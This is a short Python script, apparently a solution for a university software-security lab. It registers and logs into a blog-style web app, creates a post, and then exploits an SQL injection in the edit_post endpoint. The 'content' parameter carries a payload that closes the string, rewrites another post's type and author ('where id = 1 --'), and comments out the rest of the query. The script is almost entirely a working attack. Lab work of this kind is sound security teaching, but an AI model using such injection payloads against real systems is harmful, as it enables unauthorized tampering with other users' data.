import requests

url = 'http://34ead85a967c3a29f1f3d306c40d31e50f45c0adc2ef24f9f20babfa4e40.project.ssof.rnl.tecnico.ulisboa.pt'

headers = {
   'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
}

login_data = {
    'username' : 'teste1',
    'password' : 'teste1'
}

with requests.Session() as s:
    init_url = url + '/init'
    login_url = url + '/login'
    register_url = url + '/register'
    new_post_url = url + '/create_post'
    edit_post = url + '/edit_post?id=9'
    data1 = {'content' : 'ola', 'type' : 'Public'}
    params_edit = {'id' : '9', 'content' : 'teste\', type = \'Public\', author = \'teste1\' where id = 1 -- ', 'type' : 'Public'}
    
    r = s.get(init_url)
    r = s.post(register_url, data = login_data)


    r = s.post(login_url, data = login_data, headers=headers)


    r = s.post(new_post_url, data=data1)
    r = s.get(url)

    r = s.post(edit_post, data=params_edit)
    r = s.get(url)

    assert 'teste' in r.text
        
    